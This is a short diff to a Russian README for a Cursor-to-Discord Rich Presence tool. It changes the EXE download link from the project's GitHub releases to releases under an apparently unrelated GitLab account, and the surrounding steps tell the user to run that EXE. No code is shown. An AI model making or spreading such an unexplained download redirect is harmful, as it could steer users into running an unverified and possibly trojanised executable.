@@ -26,7 +26,7 @@ Discord официально даёт **только 2 строки**:
 
 ## Установка
 
-1. Скачай [CursorDiscordRPC.exe](https://github.com/ItzHanchik/cursor-discord-rpc/releases/latest)
+1. Скачай [CursorDiscordRPC.exe](https://gitlab.com/artembucka382/cursor-discord-rpc/-/releases)
 2. Закрой старые копии (трей → Выход)
 3. Запусти EXE — Client ID уже вшит
 4. *(Опционально)* в [Developer Portal](https://discord.com/developers/applications) у приложения загрузи Art Asset с ключом `cursor`
